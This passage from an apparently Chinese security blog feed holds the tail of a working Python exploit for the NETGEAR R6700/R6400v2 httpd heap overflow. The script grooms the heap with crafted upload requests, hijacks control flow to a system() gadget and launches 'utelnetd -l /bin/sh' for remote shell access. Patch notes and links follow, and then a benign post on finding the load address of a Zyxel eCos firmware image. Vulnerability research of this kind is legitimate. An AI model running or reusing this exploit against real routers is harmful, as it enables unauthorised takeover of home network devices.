class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">XXX:</span> useless??? use __malloc_consolidate() to make the heap consistent</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+] malloc 0x38 chunk&#x27;</span></span><br><span class="line">f = copy.deepcopy(files)</span><br><span class="line">f[<span class="string">&#x27;filename&#x27;</span>] = make_filename(<span class="number">0x38</span>)</span><br><span class="line">post_request(path, headers, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+] malloc 0x20 chunk&#x27;</span></span><br><span class="line"><span class="comment"># r0 0x1033ba0 &lt;-- return here</span></span><br><span class="line">f = copy.deepcopy(files)</span><br><span class="line">f[<span class="string">&#x27;filename&#x27;</span>] = make_filename(<span class="number">0x20</span>)</span><br><span class="line">post_request(path, headers, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+] malloc 0x8 chunk&#x27;</span></span><br><span class="line"><span class="comment"># 0x103400c ◂— 0x10</span></span><br><span class="line"><span class="comment"># r0 0x1034010 &lt;-- return here          # <span class="doctag">TODO:</span> how to make it stable (0x1034010/0x1034020)</span></span><br><span class="line">f = copy.deepcopy(files)</span><br><span class="line">f[<span class="string">&#x27;filename&#x27;</span>] = make_filename(<span class="number">0x8</span>)</span><br><span class="line">post_request(path, headers, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+] malloc 0x20 chunk&#x27;</span></span><br><span class="line"><span class="comment"># r0 0x1033ba0 &lt;-- return here</span></span><br><span class="line">headers = [<span class="string">&#x27;Host: %s:%s&#x27;</span> % (rhost, rport)]  <span class="comment"># remove `&#x27;a&#x27;*0x200 + &#x27;: d4rkn3ss&#x27;`</span></span><br><span class="line">f = copy.deepcopy(files)</span><br><span class="line">f[<span class="string">&#x27;filename&#x27;</span>] = make_filename(<span class="number">0x20</span>)</span><br><span class="line">f[<span class="string">&#x27;filecontent&#x27;</span>] = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x468</span> + p32(<span class="number">0x24e0</span>) + p32(<span class="number">0x10</span>)    <span class="comment"># offset: 0x470</span></span><br><span class="line">post_request(path, headers, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+] malloc 0x2080 chunk and try to overwrite size of 0x28 chunk -&gt; 0x9.&#x27;</span></span><br><span class="line"><span class="comment"># r0 0x1031ac8 &lt;-- return here</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># 0x1031b20     # consolidated free chunk</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># r0 0x1033ba0</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># 0x103400c ◂— 0x10</span></span><br><span class="line"><span class="comment"># r0 0x1034010</span></span><br><span class="line">malloc_size = <span class="number">0x2080</span>        <span class="comment"># a large value is ok, not need to be precise in this case</span></span><br><span class="line">f = copy.deepcopy(files)</span><br><span class="line">f[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;StringFilepload&#x27;</span></span><br><span class="line">f[<span class="string">&#x27;filename&#x27;</span>] = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack $PC in __stdio_WRITE()</span></span><br><span class="line">system_gadget = <span class="number">0xF3C8</span></span><br><span class="line">cmd = <span class="string">&#x27;utelnetd -d         -l /bin/sh&#x27;</span>.ljust(<span class="number">32</span>, <span class="string">&#x27;\x00&#x27;</span>)    <span class="comment"># changed to &quot;utelnetd -d      -d -l /bin/sh&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaayzaazbaazcaazdaazeaazfaazgaazhaaziaazjaazkaazlaazmaaznaazoaazpaazqaazraazsaaztaazuaazvaazwaazxaazyaazzababacabadabaeabafabagabahabaiabajabakabalabamabanabaoabapabaqabarabasabatabauabavabawabaxabayabazabbbabbcabbdabbeabbfabbgabbhabbiabbjabbkabblabbmabbnabboabbpabbqabbrabbsabbtabbuabbvabbwabbxabbyabbzabcbabccabcdabceabcfabcgabchabciabcjabckabclabcmabcnabcoabcpabcqabcrabcsabctabcuabcvabcwabcxabcyabczabdbabdcabddabdeabdfabdgabdhabdiabdjabdkabdlabdmabdnabdoabdpabdqabdrabdsabdtabduabdvabdwabdxabdyabdzabebabecabedabeeabefabegabehabeiabejabekabelabemabenabeoabepabeqaberabesabetabeuabevabewabexabeyabezabfbabfcabfdabfeabffabfgabfhabfiabfjabfkabflabfmabfnabfoabfpabfqabfrabfsabftabfuabfvabfwabfxabfyabfzabgbabgcabgdabgeabgfabggabghabgiabgjabgkabglabgmabgnabgoabgpabgqabgrabgsabgtabguabgvabgwabgxabgyabgzabhbabhcabhdabheabhfabhgabhhabhiabhjabhkabhlabhmabhnabhoabhpabhqabhrabhsabhtabhuabhvabhwabhxabhyabhzabibabicabidabieabifabigabihabiiabijabikabilabimabinabioabipabiqabirabisabitabiuabivabiwabixabiyabizabjbabjcabjdabjeabjfabjgabjhabjiabjjabjkabjlabjmabjnabjoabjpabjqabjrabjsabjtabjuabjvabjwabjxabjyabjzabkbabkcabkdabkeabkfabkgabkhabkiabkjabkkabklabkmabknabkoabkpabkqabkrabksabktabkuabkvabkwabkxabkyabkzablbablcabldableablfablgablhabliabljablkabllablmablnabloablpablqablrablsabltabluablvablwablxablyablzabmbabmcabmdabmeabmfabmgabmhabmiabmjabmkabmlabmmabmnabmoabmpabmqabmrabmsabmtabmuabmvabmwabmxabmyabmzabnbabncabndabneabnfabngabnhabniabnjabnkabnlabnmabnnabnoabnpabnqabnrabnsabntabnuabnvabnwabnxabnyabnzabobabocabodaboeabofabogabohaboiabojabokabolabomabonabooabopaboqaborabosabotabouabovabowaboxaboyabozabpbabpcabpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxabpyabpzabqbabqcabqdabqeabqfabqgabqhabqiabqjabqkabqlabqmabqnabqoabqpabqqabqrabqsabqtabquabqvabqwabqxabqyabqzabrbabrcabrdabreabrfabrgabrhabriabrjabrkabrlabrmabrnabroabrpabrqabrrabrsabrtabruabrvabrwabrxabryabrzabsbabscabsdabseabsfabsgabshabsiabsjabskabslabsmabsnabsoabspabsqabsrabssabstabsuabsvabswabsxabsyabszabtbabtcabtdabteabtfabtgabthabtiabtjabtkabtlabtmabtnabtoabtpabtqabtrabtsabttabtuabtvabtwabtxabtyabtzabubabucabudabueabufabugabuhabuiabujabukabulabumabunabuoabupabuqaburabusabutabuuabuvabuwabuxabuyabuzabvbabvcabvdabveabvfabvgabvhabviabvjabvkabvlabvmabvnabvoabvpabvqabvrabvsabvtabvuabvvabvwabvxabvyabvzabwbabwcabwdabweabwfabwgabwhabwiabwjabwkabwlabwmabwnabwoabwpabwqabwrabwsabwtabwuabwvabwwabwxabwyabwzabxbabxcabxdabxeabxfabxgabxhabxiabxjabxkabxlabxmabxnabxoabxpabxqabxrabxsabxtabxuabxvabxwabxxabxyabxzabybabycabydabyeabyfabygabyhabyiabyjabykabylabymabynabyoabypabyqabyrabysabytabyuabyvabywabyxabyyabyzabzbabzcabzdabzeabzfabzgabzhabziabzjabzkabzlabzmabznabzoabzpabzqabzrabzsabztabzuabzvabzwabzxabzyabzzacacadacaeacafacagacahacaiacajacakacalacamacanacaoacapacaqacaracasacatacauacavacawacaxacayacazacbbacbcacbdacbeacbfacbgacbhacbiacbjacbkacblacbmacbnacboacbpacbqacbracbsacbtacbuacbvacbwacbxacbyacbzaccbacccaccdacceaccfaccgacchacciaccjacckacclaccmaccnaccoaccpaccqaccraccsacctaccuaccvaccwaccxaccyacczacdbacdcacddacdeacdfacdgacdhacdiacdjacdkacdlacdmacdnacdoacdpacdqacdracdsacdtacduacdvacdwacdxacdyacdzacebacecacedaceeacefacegacehaceiacejacekacelacemacenaceoacepaceqaceracesacetaceuacevacewacexaceyacezacfbacfcacfdacfeacffacfgacfhacfiacfjacfkacflacfmacfnacfoacfpacfqacfracfsacftacfuacfvacfwacfxacfyacfzacgbacgcacgdacgeacgfacggacghacgiacgjacgkacglacgmacgnacgoacgpacgqacgracgsacgtacguacgvacgwacgxacgyacgzachbachcachdacheachfachgachhachiachjachkachlachmachnachoachpachqachrachsachtachuachvachwachxachyachzacibacicacidacieacifacigacihaciiacijacikacilacimacinacioacipaciqaciracisacitaciuacivaciwacixaciyacizacjbacjcacjdacjeacjfacjgacjhacjiacjjacjkacjlacjmacjnacjoacjpacjqacjracjsacjtacjuacjvacjwacjxacjyacjzackbackcackdackeackfackgackhackiackjackkacklackmacknackoackpackqackracksacktackuackvackwackxackyackzaclbaclcacldacleaclfaclgaclhacliacljaclkacllaclmaclnacloaclpaclqaclraclsacltacluaclvaclwaclxaclyaclzacmbacmcacmdacmeacmfacmgacmhacmiacmjacmkacmlacmmacmnacmoacmpacmqacmracmsacmtacmuacmvacmwacmxacmyacmzacnbacncacndacneacnfacngacnhacniacnjacnkacnlacnmacnnacnoacnpacnqacnracnsacntacnuacnvacnwacnxacnyacnzacobacocacodacoeacofacogacohacoiacojacokacolacomaconacooacopacoqacoracosacotacouacovacowacoxacoyacozacpbacpcacpdacpeacpfacpgacphacpiacpjacpkacplacpmacpnacpoacppacpqacpracpsacptacpuacpvacpwacpxacpyacpzacqbacqcacqdacqeacqfacqgacqhacqiacqjacqkacqlacqmacqnacqoacqpacqqacqracqsacqtacquacqvacqwacqxacqyacqzacrbacrcacrdacreacrfacrgacrhacriacrjacrkacrlacrmacrnacroacrpacrqacrracrsacrtacruacrvacrwacrxacryacrzacsbacscacsdacseacsfacsgacshacsiacsjacskacslacsmacsnacsoacspacsqacsracssacstacsuacsvacswacsxacsyacszactbactcactdacteactfactgacthactiactjactkactlactmactnactoactpactqactractsacttactuactvactwactxactyactzacubacucacudacueacufacugacuhacuiacujacukaculacumacunacuoacupacuqacuracusacutacuuacuvacuwacuxacuyacuzacvbacvcacvdacveacvfacvgacvhacviacvjacvkacvlacvmacvnacvoacvpacvqacvracvsacvtacvuacvvacvwacvxacvyacvzacwbacwcacwdacweacwfacwgacwhacwiacwjacwkacwlacwmacwnacwoacwpacwqacwracwsacwtacwuacwvacwwacwxacwyacwzacxbacxcacxdacxeacxfacxgacxhacxiacxjacxkacxlacxmacxnacxoacxpacxqacxracxsacxtacxuacxvacxwacxxacxyacxzacybacycacydacyeacyfacygacyhacyiacyjacykacylacymacynacyoacypacyqacyracysacytacyuacyvacywacyxacyyacyzaczbaczcaczdaczeaczfaczgaczhacziaczjaczkaczlaczmacznaczoaczpaczqaczraczsacztaczuaczvaczwaczxaczyaczzadadaeadafadagadahadaiadajadakadaladamadanadaoadapadaqadaradasadatadauadavadawadaxadayadazadbbadbcadbdadbeadbfadbgadbhadbiadbjadbkadbladbmadbnadboadbpadbqadbradbsadbtadbuadbvadbwadbxadbyadbzadcbadccadcdadceadcfadcgadchadciadcjadckadcladcmadcnadcoadcpadcqadcradcsadctadcuadcvadcwadcxadcyadczaddbaddcadddaddeaddfaddgaddhaddiaddjaddkaddladdmaddnaddoaddpaddqaddraddsaddtadduaddvaddwaddxaddyaddzadebadecadedadeeadefadegadehadeiadejadekadelademadenadeoadepadeqaderadesadetadeuadevadewadexadeyadezadfbadfcadfdadfea&#x27;</span></span><br><span class="line"></span><br><span class="line">payload_offset = payload.index(<span class="string">&quot;baaz&quot;</span>)</span><br><span class="line">payload = payload.replace(payload[payload_offset+<span class="number">0x24</span>:payload_offset + <span class="number">0x24</span> +<span class="number">4</span>], p32(system_gadget))</span><br><span class="line">payload = payload.replace(payload[payload_offset:payload_offset+<span class="number">32</span>], cmd)</span><br><span class="line"></span><br><span class="line">f[<span class="string">&#x27;filecontent&#x27;</span>] = p32(malloc_size).ljust(<span class="number">0x10</span>) + payload + p32(<span class="number">0x9</span>)</span><br><span class="line">post_request(<span class="string">&#x27;/strtblupgrade.cgi.css&#x27;</span>, headers, f)</span><br></pre></td></tr></table></figure><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>以<code>R6400v2-V1.0.4.98_10.0.71</code>版本为例，在<code>http_d()</code>函数中存在一处变更如下：在定位到<code>&quot;Content-Length: &quot;</code>后判断其前一个字符是否为<code>&#39;\n&#39;</code>，应该是对该漏洞的修复。</p><img data-src="images/patch_v1_0_4_98.png" style="zoom:80%"><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文基于<code>R6400v2</code>型号设备，对<code>R6700</code>设备上的堆溢出漏洞进行了分析，并重点介绍了漏洞利用的思路。在参考原始思路实现漏洞利用的过程中，”意外”发现了另一种方式可直接劫持控制流。当然，由于不同设备上的堆布局可能不太一致，这种方式可能不具普适性(甚至带有一点运气的成分…)，而原始的利用思路则比较通用。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwOS8=">(0Day) NETGEAR R6700 httpd strtblupgrade Integer Overflow Remote Code Execution Vulnerability<i class="fa fa-external-link-alt"></i></span> </li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Jsb2cvMjAyMC82LzI0L3pkaS0yMC03MDktaGVhcC1vdmVyZmxvdy1pbi10aGUtbmV0Z2Vhci1uaWdodGhhd2stcjY3MDAtcm91dGVy">ZDI-20-709: HEAP OVERFLOW IN THE NETGEAR NIGHTHAWK R6700 ROUTER<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwNjE5ODIvU2VjdXJpdHktQWR2aXNvcnktZm9yLU11bHRpcGxlLVZ1bG5lcmFiaWxpdGllcy1vbi1Tb21lLVJvdXRlcnMtTW9iaWxlLVJvdXRlcnMtTW9kZW1zLUdhdGV3YXlzLWFuZC1FeHRlbmRlcnM=">Security Advisory for Multiple Vulnerabilities on Some Routers, Mobile Routers, Modems, Gateways, and Extenders<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9lM3BlbS5naXRodWIuaW8vMjAxOS8wOC8yNi8wY3RmLTIwMTkvZW1iZWRkZWRfaGVhcC8=">0ctf2019 Final embedded_heap题解<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于信安之路，文章链接：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRnZxZmNIamRNNi1MVmYtbFFYenBsQQ==">https://mp.weixin.qq.com/s/FvqfcHjdM6-LVf-lQXzplA<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netgear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zyxel设备eCos固件加载地址分析</title>
      <link href="2021/03/04/Zyxel%E8%AE%BE%E5%A4%87eCos%E5%9B%BA%E4%BB%B6%E5%8A%A0%E8%BD%BD%E5%9C%B0%E5%9D%80%E5%88%86%E6%9E%90/"/>
      <url>2021/03/04/Zyxel%E8%AE%BE%E5%A4%87eCos%E5%9B%BA%E4%BB%B6%E5%8A%A0%E8%BD%BD%E5%9C%B0%E5%9D%80%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在分析<code>Zyxel</code> 某型号设备时，发现该设备的固件无法采用<code>binwalk</code>等工具进行提取。根据<code>binwalk</code>的提示信息，猜测该设备使用的是<code>eCos</code>实时操作系统，其固件是一个单一大文件。由于不知道其加载地址，在使用<code>IDA</code>等工具进行分析时，无法建立正确的交叉引用，直接逆向会比较麻烦。而网上与<code>eCos</code>固件分析相关的资料不多，在没有相关的芯片文档或<code>SDK</code>手册等资料的前提下，从该固件本身出发，通过对固件进行简单分析，寻找固件中引用的固定地址，最终确定了该固件的加载地址。</p><a id="more"></a><h3 id="binwalk分析"><a href="#binwalk分析" class="headerlink" title="binwalk分析"></a>binwalk分析</h3><p>首先使用<code>binwalk</code>工具对固件进行分析，如下。尝试使用<code>-e</code>选项进行提取时失败，说明该固件可能就是一个单一大文件。从输出中可以看到很多与<code>eCos</code>相关的字符串，其中<code>&quot;eCos kernel exception handler, architecture: MIPSEL, exception vector table base address: 0x80000200&quot;</code>指出了该文件的架构(<code>MIPSEL</code>)和异常向量表基地址(<code>0x80000200</code>)。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk RGS200-12P.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             eCos kernel exception handler, architecture: MIPSEL, exception vector table base address: 0x80000200</span><br><span class="line">128           0x80            eCos kernel exception handler, architecture: MIPSEL, exception vector table base address: 0x80000200</span><br><span class="line">5475588       0x538D04        Unix path: /home/remus/svn/ivs/IVSPL5-ZyXEL_New/src_0603/build/../build/obj/ecos/install/include/cyg/libc/stdlib/atox.inl</span><br><span class="line">5475653       0x538D45        eCos RTOS string reference: &quot;ecos/install/include/cyg/libc/stdlib/atox.inl&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> ...</span></span><br><span class="line">5945083       0x5AB6FB        eCos RTOS string reference: &quot;ecos_driver_vid_to_if_index!&quot;</span><br><span class="line">5949577       0x5AC889        eCos RTOS string reference: &quot;ecos_driver_inject vid=%u, length=%u&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> ...</span> </span><br><span class="line">6525239       0x639137        eCos RTOS string reference: &quot;eCos/packages/devs/serial/generic/16x5x/current/src/ser_16x5x.c&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> ...</span></span><br></pre></td></tr></table></figure><p>尝试使用<code>IDA</code>工具直接加载该文件，设置架构为<code>mipsel</code>、加载地址为<code>0x80000200</code>后，如下。可以看到没有识别出一个函数，整个<code>segment</code>都是<code>Unexplored</code>状态，估计是因为加载地址不正确，因此需要想办法获取固件的加载地址。</p><blockquote><p>一般，判断加载地址是否正确的方式包括：1) 成功识别出的函数个数；2）正确的字符串交叉引用个数。</p><p>后来发现即使加载基址正确，初始状态也是这样，需要在对应的地方手动<code>Make Code</code>才行 。。。可能还需要有合适的loader 进行初始化 ??? 相比而言，<code>Ghidra</code>就可以自动进行分析。</p></blockquote><img data-src="images/ida_loadbase_0x80000000.png" style="zoom:65%"><p>根据相关信息进行查找，文章<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIwNDA1MDA1L2FydGljbGUvZGV0YWlscy83Nzk3MTkyOQ==">ecos vector.S 分析II<i class="fa fa-external-link-alt"></i></span>中简单介绍了<code>eCos</code>异常中断的初始化及处理等知识，如下，尝试其中提到的地址<code>0x80000180</code>似乎不对。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># mips cpu 产生exception&#x2F;interrupt后，cpu会跳到特定的几个地址上,</span><br><span class="line"># BEV&#x3D;0时，一般的在0x80000180,当然还有些其他地址，详细的要去看mips书籍</span><br><span class="line"># 这里有这样的代码</span><br><span class="line">FUNC_START(other_vector)</span><br><span class="line">    mfc0    k0,cause        # K0 &#x3D; exception cause</span><br><span class="line">    nop</span><br><span class="line">    andi    k0,k0,0x7F        # isolate exception code</span><br><span class="line">    la      k1,hal_vsr_table    # address of VSR table</span><br><span class="line">    add     k1,k1,k0        # offset of VSR entry</span><br><span class="line">    lw      k1,0(k1)        # k1 &#x3D; pointer to VSR</span><br><span class="line">    jr      k1            # go there</span><br><span class="line">    nop                # (delay slot)</span><br><span class="line">FUNC_END(other_vector)</span><br></pre></td></tr></table></figure><p>在<code>MLT linker</code>文件<span class="exturl" data-url="aHR0cHM6Ly9naXQuZmFsY29tLmRlL3B1Yi9lY29zLy0vYmxvYi81YWUyMGMzODRmOTIwNjcxNjFmZTQ3Y2QxYmVkNTc3ZDRlNWIxYTJiL3BhY2thZ2VzL2hhbC9taXBzL3R4NDkvY3VycmVudC9zcmMvbWlwc190eDQ5Lmxk">mips_tx49.ld<i class="fa fa-external-link-alt"></i></span>中提到了<code>hal_vsr_table</code>和<code>hal_virtual_vector_table</code>等地址，搜索<code>SECTION_rom_vectors (rom</code>，尝试找到的一些地址后仍然不对。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MLT linker script for MIPS TX49</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* this version for ROM startup */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTION_rom_vectors(_region_, _vma_, _lma_) \</span></span><br><span class="line">    .rom_vectors _vma_ : _lma_ \</span><br><span class="line">    &#123; KEEP (*(.reset_vector)) \</span><br><span class="line">    . = ALIGN(<span class="number">0x200</span>); KEEP (*(.utlb_vector)) \</span><br><span class="line">    . = ALIGN(<span class="number">0x100</span>); . = . + <span class="number">4</span>; \</span><br><span class="line">    . = ALIGN(<span class="number">0x80</span>); KEEP(*(.other_vector)) \</span><br><span class="line">    . = ALIGN(<span class="number">0x100</span>); KEEP(*(.debug_vector)) &#125; \</span><br><span class="line">    &gt; _region_</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ROM startup version of ROM vectors */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0-0x200 reserved for vectors</span></span><br><span class="line">hal_vsr_table = <span class="number">0x80000200</span>;</span><br><span class="line">hal_virtual_vector_table = <span class="number">0x80000300</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// search results</span></span><br><span class="line"><span class="comment">// packages/hal/mips/idt79s334a/current/include/pkgconf/mlt_mips_idt32334_refidt334_rom.ldi</span></span><br><span class="line">SECTION_rom_vectors (rom, <span class="number">0x80200000</span>, LMA_EQ_VMA)</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h3 id="bare-metal-firmware加载地址分析"><a href="#bare-metal-firmware加载地址分析" class="headerlink" title="bare-metal firmware加载地址分析"></a>bare-metal firmware加载地址分析</h3><p>一般来说，针对<code>bare-metal firmware</code>，为了确定其加载地址，可以通过查询对应的芯片文档或<code>SDK</code>手册等资料，得到内存空间的映射分布。示例如下，其中<code>Flash memory</code>的范围为<code>0x08000000~0x0801FFFF</code>。</p><img data-src="images/stm32_memory_layout.png" style="zoom:65%"><blockquote><p>来源: <span class="exturl" data-url="aHR0cHM6Ly93d3cuc3QuY29tL3Jlc291cmNlL2VuL2RhdGFzaGVldC9zdG0zMmYxMDNjOC5wZGY=">STM32F103C8 memory mapping<i class="fa fa-external-link-alt"></i></span></p></blockquote><p>此外，对于一些<code>ARM</code>架构的<code>bare-metal firmware</code>，还可以通过中断向量表来推测加载地址。中断向量表中的前2项内容分别为<code>Initial SP value</code>和<code>Reset</code>，其中<code>Reset</code>为<code>reset routine</code>的地址，设备上电/重置时将会从这里开始执行，根据该地址推测可能的加载地址。</p><blockquote><p>In the used cores, an ARM Cortex-M3, the boot process is build around the reset exception. At device boot or reboot the core assumes the vector table at <code>0x0000.0000</code>. The vector table contains exception routines and the initial value of the stack pointer. On power-on now the microcontroller first loads the initial stack pointer from <code>0x0000.0000</code> and then address of the reset vector (<code>0x0000.0004</code>) into the program counter register (<code>R15</code>). The execution continues at this address. (<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjNvci5kZS9zdGFydGluZy1lbWJlZGRlZC1yZXZlcnNlLWVuZ2luZWVyaW5nLWZyZWVydG9zLWxpYm9wZW5jbTMtb24tc3RtMzJmMTAzYzh0Ni5odG1s">来源<i class="fa fa-external-link-alt"></i></span>)</p></blockquote><img data-src="images/arm_vector_table.png" style="zoom:65%"><blockquote><p>来源：<span class="exturl" 